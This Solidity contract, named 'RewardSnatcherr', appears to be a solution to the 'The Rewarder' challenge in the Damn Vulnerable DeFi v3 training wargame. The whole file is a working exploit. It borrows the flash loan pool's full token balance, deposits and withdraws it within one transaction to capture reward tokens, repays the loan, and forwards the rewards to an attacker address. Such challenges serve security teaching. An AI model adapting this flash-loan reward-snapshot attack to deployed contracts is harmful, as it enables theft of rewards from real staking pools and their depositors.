// SPDX-License-identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

import {FlashLoanerPool} from "dvd-v3/the-rewarder/FlashLoanerPool.sol";
import {TheRewarderPool} from "dvd-v3/the-rewarder/TheRewarderPool.sol";
import {DamnValuableToken} from "dvd-v3/DamnValuableToken.sol";
import {RewardToken} from "dvd-v3/the-rewarder/RewardToken.sol";

contract RewardSnatcherr {
    FlashLoanerPool public fl;
    TheRewarderPool public trp;
    RewardToken public rt;
    DamnValuableToken public dvt;

    address payable public attacker;

    

    constructor(FlashLoanerPool _fl, TheRewarderPool _trp, DamnValuableToken _dvt, address payable _attacker) {
        fl = _fl;
        trp = _trp;
        attacker = _attacker;
        dvt = _dvt;
        rt = trp.rewardToken();
    }

    function initiate() external {
        uint256 maxLoan = dvt.balanceOf(address(fl));
        fl.flashLoan(maxLoan);
    }

    function receiveFlashLoan(uint256 amount) external {
        // deposit into rewarder pool
        // receive rewardtokens
        // withdraw from the rewarder pool
        // transfer back to flashloan
        dvt.approve(address(trp), amount);
        trp.deposit(amount);
        trp.withdraw(amount);
        SafeTransferLib.safeTransfer(address(dvt), address(fl), amount);
    }

    function getFunds() external {
        uint256 rewards = rt.balanceOf(address(this));
        SafeTransferLib.safeTransfer(address(rt), attacker, rewards);
    }

    receive() external payable {}

    fallback() external payable {}
}
